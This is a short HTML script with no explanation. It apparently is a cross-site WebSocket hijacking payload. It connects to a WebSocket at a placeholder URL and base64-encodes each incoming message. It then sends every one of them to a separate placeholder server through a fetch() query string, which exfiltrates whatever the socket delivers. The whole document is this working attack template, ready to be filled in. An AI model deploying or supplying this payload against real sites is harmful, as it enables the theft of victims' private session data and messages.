<script>
var ws = new WebSocket('wss://your-websocket-url');
ws.onopen = function() {
        ws.send("READY");
        };
ws.onmessage = function(event) {
        fetch('https://server_url/?text=' + btoa(event.data));
        };
</script>
